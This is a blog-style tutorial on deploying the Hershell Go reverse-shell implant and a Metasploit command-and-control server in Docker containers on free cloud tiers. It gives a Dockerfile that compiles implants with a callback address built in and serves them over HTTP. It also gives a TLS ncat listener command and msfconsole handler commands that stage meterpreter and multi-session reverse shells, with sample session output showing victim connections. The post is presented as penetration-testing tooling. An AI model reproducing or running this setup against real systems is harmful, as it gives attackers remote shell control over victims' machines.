---
layout: post
title: "Cloud reverse-shell: Hershell, Metasploit and Docker"
description: "Offensive cloud tips: Deploying offensive tooling in a golang cloud environment, for free!"
thumbnail: chess-knight
categories: offensive
excerpt_separator: <!--more-->
published: true
tags:
  - shell
  - metasploit
  - cloud
  - aws
  - azure
  - gce
  - pentest
  - golang


---

## Using Docker to host a cloud hershell implant listener and a Metasploit C2

------

In the following article we'll be deploying Hershell, a minimal golang reverse shell, and its C2 using Docker to host it on a cloud provider's infrastructure.  
One of the many powers of golang is it's cross platform capabilities. Since the codebase is minimal, we'll see how to use a container to host our C2.

<!--more-->

------

# Goal

We want to use Docker to build a fresh [hershell](https://github.com/lesnuages/hershell) implant and easily distribute it.  

[Hershell](https://github.com/lesnuages/hershell) comes with the ability to upgrade the infected target to a `meterpreter` implant or inject shellcode directly in memory. We'll also be using Docker to host our second stage Metasploit C2 (C3 in this article)

Once done, generating, sharing and managing the implant should be a fast and cloud-native process.

Deploying a server to catch the reverse callback will should be fast and clean.  
# Requirements

You'll need a `docker` environment [installed](https://docs.docker.com/install/), and some place to host your C2 and C3.  
Since we're using containers, you can very well try this on your local machine.  
I recommend looking into [free tiers](https://github.com/ripienaar/free-for-dev) from providers such as AWS, Azure or Google Cloud Engine, as you can hardly beat their datacenter Internet speed.

Some basic UNIX and Docker knowledge is expected.

# Why hershell


Hershell aims to be the opposite of a feature-rich implant.  
It is elegant in its simplicity, written in golang making it cross-platform.  
Once infected, the target can be upgraded to a meterpreter shell with multiple egress methods.  

The meterpreter staging currently supports the following payloads :

* `windows/meterpreter/reverse_tcp`
* `windows/x64/meterpreter/reverse_tcp`
* `windows/meterpreter/reverse_http`
* `windows/x64/meterpreter/reverse_http`
* `windows/meterpreter/reverse_https`
* `windows/x64/meterpreter/reverse_https`

Hershell generates a TLS certificate/key thats to cypher communications with the implant, so we'll want to easily recover those too.


# Steps

## Creating a Hershell build with a Dockerfile

### Building

We'll create the Dockerfile in two steps.  
First, we'll build hershell and its server using the provided Makefile.  
Second, we'll launch a minimal HTTP server to easily fetch the generated binaries and cert.

#### Base

We'll be building the hershell implants using a `golang:alpine` base to keep it small (OS is ~20MB).  

A quick note about golang containers, there is a `/go` root dir where `/go/bin/` is the compiled binaries destination folder, and the `/go/src/` folder populated with source code.  

Since hershell is hosted on github, we can simply tell golang to fetch it using the `go get -u github.com/lesnuages/hershell` command.

Finally, we'll need the `make`, `git` and `openssl` packages too.  


```bash
FROM golang:alpine

RUN apk add --update make git openssl \
    && go get github.com/lesnuages/hershell

WORKDIR /go/src/github.com/lesnuages/hershell/

```

#### Build Args

Dockerfiles have the ability to use `build-args`, that's what we'll use to give hershell it's home address.  
[*More info*](https://docs.docker.com/engine/reference/builder/#arg).  

We'll be using the following arguments to build our hershell implant:
* C2 IP/Domain name
* C2 Reverse port
* 32/64bit target architecture

Default values to avoid problems when testing.

```
ARG LHOST=127.0.0.1
ARG LPORT=8080
ARG GOARCH=64
```

#### Compilation

For our test, I'll be compiling the Linux and Windows binaries at every docker build. For some reason Windows binaries don't get moved to `/go/bin/` so we'll copy them.  
Since we need to retrieve our certificates, we'll copy these too.  


```
RUN make depends && make windows${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && make linux${GOARCH} LHOST=${LHOST} LPORT=${LPORT} \
    && cp server.key server.pem *.exe /go/bin/ 
    
```

### Sharing

There's hardly an easier method than the classic `python -m SimpleHTTPServer` to serve files using a quick web server.  

Since we're using a golang image, it would be counter-productive to add another language environment to our container. Instead, we'll use `serve`, a [*simple Go file server for command line development use, a la Python's SimpleHTTPServer*](https://github.com/fogleman/serve).  
Perfect :smirk:

We'll simply `go get`-it like our `hershell` package. `serve` uses port 8000 by default.

```
RUN apk add --update make git openssl upx \
    && go get github.com/lesnuages/hershell \
    && go get -u github.com/fogleman/serve

```

Finally, we'll have our Dockerfile `EXPOSE` the port and `serve` our generated binaries and TLS cert&key.

```
EXPOSE 8000
ENTRYPOINT [ "serve", "-dir", "/go/bin/"]
```

* Let's see how this goes

![build](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_build.gif?raw=true)

![serve](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_serve.png?raw=true)

## Deploying the implant

To launch our web page and fetch our files, we simply run:

```
docker run -d hershell:latest
```

Point your web browser to `http://DOCKER-HOST-IP:8000`, download the implant for your target environment, as well as `server.pem` and `server.key` for our C2.

Alternatively, you can use `wget` or `curl`.

You should keep the hershell container running as we'll need to fetch our certificate and key with Metasploit.

### Ncat with TLS cert & key

To catch the initial reverse call, we'll use the `ncat` example provided. `ncat` can be found in the `nmap` package.

Once our `server.pem` and `server.key` files downloaded, we can set it up like so:

```
$ cat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 8088
```

If everything goes according to plan, running the hershell binary should get you a clean reverse connection to the ncat listener.

![rev](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_ncat.png?raw=true)

### MSF

[This](https://hub.docker.com/r/remnux/metasploit/) build encapsulates the Metasploit Framework, as well as a pre-configured `postgresql` server with the `msfdb` working.
The `nmap` package is also pre installed, meaning we have `ncat` in the container too.

### Launch

We're going to upgrade our hershell to a meterpreter session, using a dockerized Metasploit console.  

Contrary to the previous method, MSF will only need our `server.key` file.


To launch our `metasploit` container, we simply do:
```bash
$ docker run -it -p "8443:8443" -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
```

The first run might take some time, so leave it running a few minutes :coffee:

We're using the `docker run` line from the [Docker hub page](https://hub.docker.com/r/remnux/metasploit/).

### Use

Once the container is up and running, you'll land in a bash shell.  
You'll find all the classic `msf` framework tools.

![msf](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_msf_binaries.png?raw=true)
We'll launch the `msfconsole` and let it load. Once you're greeted with the prompt, we'll need to retrieve our `server.key`.

We can use `wget` from inside the `msfconsole` and fetch them from our previously mentioned `serve` http page.

```
msfconsole
msf5 > wget http://DOCKER-IP:8000/server.key

```

Next, we're preparing our handler. I'll be using the `reverse_https` method.

```bash
msf5 > use exploit/multi/handler
msf5 > set payload windows/x64/meterpreter/reverse_https
msf5 > set lhost DOCKER-IP
msf5 > set lport 8443
msf5 > set HandlerSSLCert ./server.pem
msf5 > exploit -j

```

In your hershell console, simply type:

```bash
[hershell]> meterpreter https YOUR-DOCKER-IP:8443
```

And hopefully, you'll be seeing this in your `msfconsole`

```bash
[*] Started HTTPS reverse handler on https://0.0.0.0:8443
cleear
[*] https://DOCKER-IP:8443 handling request from VICTIM-IP; (UUID: q4jynvuf) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (DOCKER-IP:8443 -> VICTIM-IP:40238) at 2018-10-04 02:09:35 +0000

```


### Multi hershell session handling from Metasploit

Catching sessions with `ncat` is nice and easy, but it does not handle *multi sessions*. We can use the Metasploit `python/shell_reverse_tcp_ssl` payload.  

Use `sessions` to interact with your targets from inside the `msfconsole`  prompt.

Let's set Metasploit up to receive both our stages in a single shot. Starting from the top:

```bash
msf5 > wget http://DOCKER-IP:8000/server.key
msf5 > use exploit/multi/handler
msf5 > set payload python/shell_reverse_tcp_ssl
msf5 > set HandlerSSLCert ./server.pem
msf5 > set lhost DOCKER-IP
msf5 > set lport 8088
msf5 > exploit -j
# Our first hershell listener is now running as a job in the background

msf5 > set payload windows/x64/meterpreter/reverse_https
msf5 > set lport 8443
msf5 > exploit -j
msf5 > sessions -l
```

Launch hershell as you would and...

```
[*] Command shell session 1 opened (DOCKER-IP:8088 -> VICTIM:39370) at 2018-10-04 02:26:32 +0000
```


## More tricks

### Using docker-machine

You can use [docker-machine](https://docs.docker.com/machine/) to seamlessly deploy your C2 instances across different cloud providers.

### Make a rc file

Once you have a working configuration in your Metasploit environment, you use the `makerc hershell.rc` to generate a config file. From there you can `cat` it from the prompt or push it elsewhere.

